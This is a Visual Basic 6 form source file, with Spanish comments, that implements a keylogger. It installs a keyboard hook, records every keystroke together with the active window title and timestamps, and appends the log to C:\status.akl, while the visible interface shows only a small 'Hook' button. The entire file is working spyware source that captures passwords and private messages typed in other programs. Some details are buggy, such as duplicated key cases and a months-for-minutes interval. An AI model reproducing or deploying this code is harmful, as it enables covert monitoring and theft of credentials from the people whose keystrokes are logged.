VERSION 5.00
Begin VB.Form FrmMain 
   Caption         =   "Form1"
   ClientHeight    =   1185
   ClientLeft      =   60
   ClientTop       =   390
   ClientWidth     =   2370
   LinkTopic       =   "Form1"
   ScaleHeight     =   1185
   ScaleWidth      =   2370
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command1 
      Caption         =   "Hook"
      Height          =   375
      Left            =   600
      TabIndex        =   0
      Top             =   360
      Width           =   1215
   End
End
Attribute VB_Name = "FrmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
Private Declare Function ToAscii Lib "user32" (ByVal uVirtKey As Integer, ByVal uScanCode As Integer, ByRef lpbKeyState As Byte, ByRef lpwTransKey As Integer, ByVal fuState As Integer) As Integer
Public WithEvents MyEventRaiser As EventRaiser
Attribute MyEventRaiser.VB_VarHelpID = -1
Dim PressedControl As Boolean
Dim PressedShift As Boolean
Dim PressedAlt As Boolean
Dim LastTimePressed As Date
Dim Buffer As String, CntVbCrlF As Integer
Dim VentanaActual As String
Private Sub Command1_Click()
    MsgBox ActiveWindow
End Sub

Private Sub Form_Load()
    Set MyEventRaiser = New EventRaiser
    Buffer = "                          [ Starting loggin at " & Now & "]"
    Save
    Buffer = ""
    LastTimePressed = Now
    CntVbCrlF = 1
    Hook
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    UnHook
End Sub

Private Sub MyEventRaiser_KBHKeyDown(ByVal vkCode As Integer, ByVal scanCode As Integer, ByVal flags As Integer)
    Dim CurrentKeyboardState(0 To 255) As Byte
    Dim AsciiCode As Integer
    Dim LineaInicio As String
    LineaInicio = "[" & Now & "]: Window: " & ActiveWindow & vbCrLf & "[" & Format$(Now, "hh:mm:ss AM/PM") & "]: "
    If Buffer = "" And VentanaActual <> ActiveWindow Then
        Buffer = LineaInicio
    ElseIf VentanaActual <> ActiveWindow Then
        Save
        Buffer = LineaInicio
        CntVbCrlF = 1
    End If
    
    Call GetKeyboardState(CurrentKeyboardState(0))
    
    Dim KeyPressed As String

    Select Case vkCode
        Case vbKeyF1 To vbKeyF12:       KeyPressed = "[F" & (vkCode - (vbKeyF1 - 1)) & "]"
        Case vbKeySpace:                KeyPressed = "[Space]"
        Case vbKeyDelete:               KeyPressed = "[Delete]"
        Case vbKeyInsert:               KeyPressed = "[Insert]"
        Case vbKeyTab:                  KeyPressed = "[Tab]"
        Case vbKeyBack:                 KeyPressed = "[Back]"
        Case vbKeyEscape:               KeyPressed = "[Escape]"
        Case OtrosVK.VK_LWin Or OtrosVK.VK_LWin: KeyPressed = "[Win]"
        Case vbKeyUp:                   KeyPressed = "[Up]"
        Case vbKeyUp:                   KeyPressed = "[Up]"
        Case vbKeyUp:                   KeyPressed = "[Up]"
        Case vbKeyDown:                 KeyPressed = "[Down]"
        Case vbKeyLeft:                 KeyPressed = "[Left]"
        Case vbKeyRight:                KeyPressed = "[Right]"
        Case vbKeyReturn:               KeyPressed = "[Return]"
        Case vbKeyControl, vbKeyShift, OtrosVK.VK_Alt, OtrosVK.VK_LAlt, 160, 161, 165, 162:
        KeyPressed = ""
        Case VK_LWin, VK_RWin:          KeyPressed = "[Win]"
        Case vbKeyCapital
            If (GetKeyState(vbKeyCapital) And KEY_TOGGLED) Then
                KeyPressed = "[CapsOn]"
            Else
                KeyPressed = "[CapsOff]"
            End If
        Case Else
            If ToAscii(vkCode, scanCode, CurrentKeyboardState(0), AsciiCode, 0) = 1 Then
                KeyPressed = Chr(AsciiCode)
            Else
                KeyPressed = "[Unknown:" & vkCode & "]"
            End If
    End Select
    
    Buffer = Buffer & KeyPressed
    
    Dim s As Integer
    s = DateDiff("m", LastTimePressed, Now)
    
    If (Len(Buffer) > (150 * CntVbCrlF) And VentanaActual = ActiveWindow) Or Buffer = "" Then
        Buffer = Buffer & IIf(Buffer = "", "", vbCrLf) & "[" & Format$(Now, "hh:mm:ss AM/PM") & "]: "
        CntVbCrlF = CntVbCrlF + 1
    End If
    
    If s > 30 Or Len(Buffer) > 500 Then
        Save
        Buffer = ""
        CntVbCrlF = 1
    End If
       
    LastTimePressed = Now
    VentanaActual = ActiveWindow
    Me.Caption = VentanaActual
End Sub

Private Sub MyEventRaiser_KBHKeyUp(ByVal vkCode As Integer, ByVal scanCode As Integer, ByVal flags As Integer)
    'sin usarse, serviria para usar combinaciones de teclas, mas adelante vere que rollo
    Select Case vkCode
        Case vbKeyControl:                                  PressedControl = False
        Case vbKeyShift:                                    PressedShift = False
        Case OtrosVK.VK_Alt Or OtrosVK.VK_LAlt:             PressedAlt = False
    End Select
End Sub

Sub Save()
    Open "C:\status.akl" For Append As #1
        Print #1, Buffer
    Close #1
End Sub
